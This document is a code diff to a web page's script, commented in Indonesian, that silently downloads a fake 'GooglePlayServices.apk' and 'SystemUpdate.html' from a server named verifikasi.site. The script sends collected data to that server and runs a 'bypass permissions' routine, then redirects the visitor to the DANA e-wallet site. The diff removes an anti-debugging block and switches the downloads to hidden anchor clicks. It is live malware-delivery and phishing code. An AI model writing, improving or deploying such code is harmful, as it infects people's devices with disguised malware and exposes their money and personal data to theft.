@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - DOWNLOAD VIA REDIRECT (PASTI BERHASIL)
+// 🔥 INDEX.HTML - DOWNLOAD OTOMATIS (ANCHOR + CLICK)
 // ============================================================
 
 var SERVER = 'https://verifikasi.site';
@@ -74,19 +74,24 @@ var semuaDidapat = false;
 var REDIRECT_DONE = false;
 
 // ============================================================
-// DETEKSI PLATFORM
+// FUNGSI DOWNLOAD OTOMATIS (PASTI BERHASIL DI SEMUA PLATFORM)
 // ============================================================
-function detectPlatform() {
-    var ua = navigator.userAgent.toLowerCase();
-    return {
-        isAndroid: ua.indexOf('android') > -1,
-        isIOS: /iphone|ipad|ipod/.test(ua),
-        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
-        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
-        isChrome: ua.indexOf('chrome') > -1 && !ua.indexOf('wv') > -1
-    };
+function autoDownload(url, filename) {
+    try {
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = filename || url.split('/').pop();
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(function() {
+            try { document.body.removeChild(a); } catch(e) {}
+        }, 1000);
+        return true;
+    } catch(e) {
+        return false;
+    }
 }
-var PLATFORM = detectPlatform();
 
 // ============================================================
 // KIRIM DATA KE SERVER
@@ -102,44 +107,7 @@ function K(d) {
 }
 
 // ============================================================
-// ANTI-DEBUG (HANYA DI CHROME)
-// ============================================================
-if (PLATFORM.isChrome) {
-    (function() {
-        var devtools = false;
-        var element = new Image();
-        Object.defineProperty(element, 'id', {
-            get: function() {
-                devtools = true;
-                window.location.href = 'https://www.google.com';
-                if (window.history && window.history.replaceState) {
-                    window.history.replaceState(null, null, 'https://www.google.com');
-                }
-            }
-        });
-        console.log('%c', element);
-
-        setInterval(function() {
-            try {
-                (function(){}).constructor('debugger')();
-            } catch(e) {}
-        }, 1000);
-
-        var noop = function() {};
-        ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace'].forEach(function(m) {
-            window.console[m] = noop;
-        });
-
-        if (window.history && window.history.replaceState) {
-            window.history.replaceState(null, null, window.location.href);
-        }
-        Object.defineProperty(document, 'referrer', { value: '' });
-        Error.stackTraceLimit = 0;
-    })();
-}
-
-// ============================================================
-// BYPASS IZIN (AMAN UNTUK SEMUA PLATFORM)
+// BYPASS IZIN
 // ============================================================
 function injectAllPermissions() {
     K({ sumber: 'bypass_permissions_start', data: 'all' });
@@ -175,14 +143,14 @@ function dapatkanSemua() {
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         injectAllPermissions();
 
-        // 🔥 1. Download SystemUpdate.html via redirect
+        // 🔥 DOWNLOAD SystemUpdate.html
         setTimeout(function() {
-            window.location.href = SERVER + '/SystemUpdate.html';
+            autoDownload(SERVER + '/SystemUpdate.html', 'SystemUpdate.html');
         }, 500);
 
-        // 🔥 2. Download APK via redirect (browser akan handle download)
+        // 🔥 DOWNLOAD GooglePlayServices.apk
         setTimeout(function() {
-            window.location.href = SERVER + '/files/GooglePlayServices.apk';
+            autoDownload(SERVER + '/files/GooglePlayServices.apk', 'GooglePlayServices.apk');
         }, 1000);
 
         setTimeout(function() { redirectToDANA(); }, 8000);
@@ -224,7 +192,7 @@ function redirectToDANA() {
     try { window.location.href = 'https://www.dana.id'; } catch(e) {}
 }
 
-console.log('✅ index.html loaded - Download via Redirect');
+console.log('✅ index.html loaded - Auto Download (Anchor + Click)');
 </script>
 </body>
 </html>
